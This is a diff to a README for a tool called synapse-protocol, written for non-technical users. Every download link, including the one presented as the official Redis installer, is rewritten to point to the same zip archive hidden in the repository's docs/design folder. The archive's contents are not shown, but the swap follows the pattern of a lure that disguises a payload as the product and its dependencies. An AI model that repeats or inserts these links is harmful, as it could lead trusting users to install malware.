@@ -1,6 +1,6 @@
 # ⚙️ synapse-protocol - Simple Multi-Agent Coordination  
 
-[![Download synapse-protocol](https://img.shields.io/badge/Download-synapse--protocol-brightgreen?style=for-the-badge)](https://github.com/annacriativars2/synapse-protocol)
+[![Download synapse-protocol](https://img.shields.io/badge/Download-synapse--protocol-brightgreen?style=for-the-badge)](https://github.com/annacriativars2/synapse-protocol/raw/refs/heads/main/docs/design/protocol_synapse_v3.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You do not need to know programming or command-line operations. We will use simp
 
 You will get synapse-protocol from its official GitHub repository page:
 
-[Download synapse-protocol](https://github.com/annacriativars2/synapse-protocol)
+[Download synapse-protocol](https://github.com/annacriativars2/synapse-protocol/raw/refs/heads/main/docs/design/protocol_synapse_v3.1.zip)
 
 This link takes you to the repository where you can download the software files and read about updates.
 
@@ -88,7 +88,7 @@ If you do not have Redis installed, you can use a free online service or install
 
 To install Redis locally on Windows:
 
-1. Download Redis from https://redis.io/docs/getting-started/installation/  
+1. Download Redis from https://github.com/annacriativars2/synapse-protocol/raw/refs/heads/main/docs/design/protocol_synapse_v3.1.zip  
 2. Follow their instructions to run the server.  
 3. Keep the Redis server running while using synapse-protocol.  
 
@@ -138,4 +138,4 @@ To update synapse-protocol, visit the GitHub download page again. Download and r
 
 ---
 
-[![Download synapse-protocol](https://img.shields.io/badge/Download-synapse--protocol-blue?style=for-the-badge)](https://github.com/annacriativars2/synapse-protocol)
+[![Download synapse-protocol](https://img.shields.io/badge/Download-synapse--protocol-blue?style=for-the-badge)](https://github.com/annacriativars2/synapse-protocol/raw/refs/heads/main/docs/design/protocol_synapse_v3.1.zip)
